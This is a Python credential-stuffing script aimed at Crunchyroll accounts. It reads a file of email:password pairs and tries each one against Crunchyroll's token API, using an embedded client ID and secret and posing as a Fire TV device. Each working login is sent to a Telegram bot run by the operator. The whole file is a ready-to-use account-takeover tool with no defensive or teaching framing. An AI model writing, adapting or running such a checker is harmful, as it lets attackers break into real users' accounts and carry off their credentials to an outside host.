import requests,random,time
from user_agent import *
from uuid import *
from rich.panel import Panel
#from rich import print

G = '\033[2;32m'
R = '\033[1;31m'
O = '\x1b[38;5;208m'


def login(email,pasw):
	headers = {"ETP-Anonymous-ID": str(uuid1),"Request-Type": "SignIn","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
	data = {"grant_type":"password","username":email,"password":pasw,"scope":"offline_access","client_id":"yhukoj8on9w2pcpgjkn_","client_secret":"q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF","device_type":"FIRETV","device_id":str(uuid1),"device_name":"kara"}
	res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token",data=data,headers=headers)
	if "refresh_token" in res.text:
		print()
		print(f' {G}{email}:{pasw}')
		requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={email}\n └─> {pasw}')
	else:
		print()
		print(f' {R}{email}:{pasw}')

##############################

tok = input(f" {O}— Token BOT => ")
print()
ID = input(f" {O}— Your ID => ")
print()
file_name = input(f" {O}— File PATH => ")
file = open(file_name).read().splitlines()
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

for line in file:
	try:
		email,pasw = line.strip().split(':')
		login(email,pasw)
	except:
		continue